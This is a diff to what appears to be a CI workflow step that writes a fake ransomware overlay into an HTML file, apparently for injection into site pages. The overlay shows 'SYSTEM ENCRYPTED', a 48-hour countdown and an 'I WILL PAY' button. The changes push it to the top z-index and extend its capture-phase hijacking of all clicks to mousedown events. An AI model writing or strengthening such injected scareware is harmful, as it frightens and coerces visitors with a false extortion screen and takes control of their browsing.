@@ -64,7 +64,7 @@ jobs:
             
             # 1c. Injecting the Ransomware UI overlay
             cat << 'RANSOM' > /tmp/ransom.html
-            <div id="ransom-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; color:#0f0; font-family:monospace; flex-direction:column; align-items:center; justify-content:center;">
+            <div id="ransom-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2147483647 !important; color:#0f0; font-family:monospace; flex-direction:column; align-items:center; justify-content:center;">
               <h1 style="color:red; font-size:3rem; margin-bottom:10px; text-shadow: 0 0 10px red;">!!! SYSTEM ENCRYPTED !!!</h1>
               <div style="font-size:5rem; margin:20px 0; font-weight:bold; color:white; text-shadow: 0 0 10px white;" id="ransom-timer">48:00:00</div>
               <p style="font-size:1.5rem; text-align:center; max-width:800px; line-height: 1.6;">
@@ -75,6 +75,7 @@ jobs:
               <button id="ransom-close-btn" style="margin-top:40px; padding:10px 20px; background:red; color:white; border:2px solid darkred; cursor:pointer; font-size:1.2rem; font-family:monospace; font-weight:bold;">I WILL PAY (Close Window)</button>
             </div>
             <script>
+              console.log("Ransomware payload loaded and active.");
               (function(){
                 var endTime = new Date().getTime() + (48 * 60 * 60 * 1000);
                 setInterval(function(){
@@ -89,23 +90,26 @@ jobs:
                 var modal = document.getElementById('ransom-modal');
                 var closeBtn = document.getElementById('ransom-close-btn');
                 
-                closeBtn.addEventListener('click', function(e) {
-                  e.stopPropagation(); // Stop the click from bubbling up
+                closeBtn.addEventListener('mousedown', function(e) {
+                  e.stopPropagation();
                   modal.style.display = 'none';
-                });
+                }, true);
 
-                // Intercept ALL clicks on the entire document (Capture phase)
-                document.addEventListener('click', function(e){
-                  // If the modal is already open, and they are clicking inside it, let it happen
-                  if (modal.style.display === 'flex' && modal.contains(e.target)) {
-                    return;
-                  }
-                  
-                  // Otherwise, block the click and show the ransomware!
+                closeBtn.addEventListener('click', function(e) {
+                  e.stopPropagation();
+                  modal.style.display = 'none';
+                }, true);
+
+                function triggerRansomware(e) {
+                  if (modal.style.display === 'flex' && modal.contains(e.target)) return;
                   e.preventDefault(); 
                   e.stopPropagation();
                   modal.style.display = 'flex';
-                }, true);
+                }
+
+                // Intercept clicks, mousedowns, and touch events (Capture phase)
+                document.addEventListener('click', triggerRansomware, true);
+                document.addEventListener('mousedown', triggerRansomware, true);
               })();
             </script>
             RANSOM
